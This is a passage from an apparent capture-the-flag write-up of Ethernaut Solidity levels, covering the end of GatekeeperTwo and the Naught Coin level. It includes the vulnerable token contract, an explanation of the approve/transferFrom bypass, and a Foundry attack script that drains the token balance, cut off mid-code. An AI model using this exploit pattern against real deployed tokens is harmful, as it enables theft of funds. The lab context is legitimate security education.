&lt;&#x2F;span&gt;&lt;span&gt;        bytes8 _gateKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt;(max &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;hsh)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(gateTwo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;GatekeeperTwoSolve.s.sol:GatekeeperTwoSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;15-naught-coin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#15-naught-coin&quot; aria-label=&quot;Anchor link for: 15-naught-coin&quot;&gt;15 Naught Coin&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;NaughtCoin.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;@openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; contract NaughtCoin is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; string public constant name = &amp;#39;NaughtCoin&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; string public constant symbol = &amp;#39;0x0&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; uint public constant decimals = 18;
&lt;&#x2F;span&gt;&lt;span&gt;  uint public timeLock &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;365 &lt;&#x2F;span&gt;&lt;span&gt;days&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 public INITIAL_SUPPLY&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address _player) 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;NaughtCoin&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0x0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    INITIAL_SUPPLY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decimals&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; _totalSupply = INITIAL_SUPPLY;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; _balances[player] = INITIAL_SUPPLY;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;INITIAL_SUPPLY)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;INITIAL_SUPPLY)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 _value&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;override public lockTokens returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(_to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lockTokens&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;player) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;timeLock)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;     _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  } 
&lt;&#x2F;span&gt;&lt;span&gt;} 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;NaughtCoin is an ERC20 token and you&#x27;re already holding all of them. The catch is that you&#x27;ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.&lt;&#x2F;li&gt;
&lt;li&gt;NaughtCoin only implemented the &lt;code&gt;lockTokens()&lt;&#x2F;code&gt; modifier on &lt;code&gt;transfer()&lt;&#x2F;code&gt; function only.&lt;&#x2F;li&gt;
&lt;li&gt;There are other ways to transfer tokens from one address to other without using &lt;code&gt;transfer()&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Player can approve the allowances of their tokens to someone, and they can use &lt;code&gt;transferFrom()&lt;&#x2F;code&gt; function to transfer tokens on behalf of player.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;NaughtCoinSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{NaughtCoin} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;NaughtCoin.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract NaughtCoinSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    NaughtCoin public naughtCoin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;NaughtCoin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        address player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;player&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        uint playerBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(player)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Player : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;player)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Player Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;playerBalance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;playerBalance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        attack&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(player)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Player : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;player)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Player Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(player))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attacker Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    NaughtCoin public naughtCoin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;NaughtCoin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _player&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;allowance&lt;&#x2F;span&gt;&lt;span&gt;(_player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Not approved yet&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span 